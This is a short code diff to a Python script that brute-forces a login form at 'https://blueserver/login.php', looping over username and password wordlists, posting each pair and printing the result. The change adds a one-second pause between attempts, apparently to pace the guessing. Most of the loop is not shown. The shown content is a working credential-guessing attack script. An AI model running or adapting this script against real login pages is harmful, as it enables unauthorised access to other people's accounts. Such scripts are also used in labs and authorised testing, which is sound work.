@@ -1,4 +1,5 @@
 import requests
+import time
 
 url = 'https://blueserver/login.php'
 user_path = 'usernames.txt'
@@ -24,3 +25,5 @@ for username in username_list:
         response = requests.post(url, data=credentials)
 
         print(f'Attempted {username}:{password}', response)
+
+        time.sleep(1)
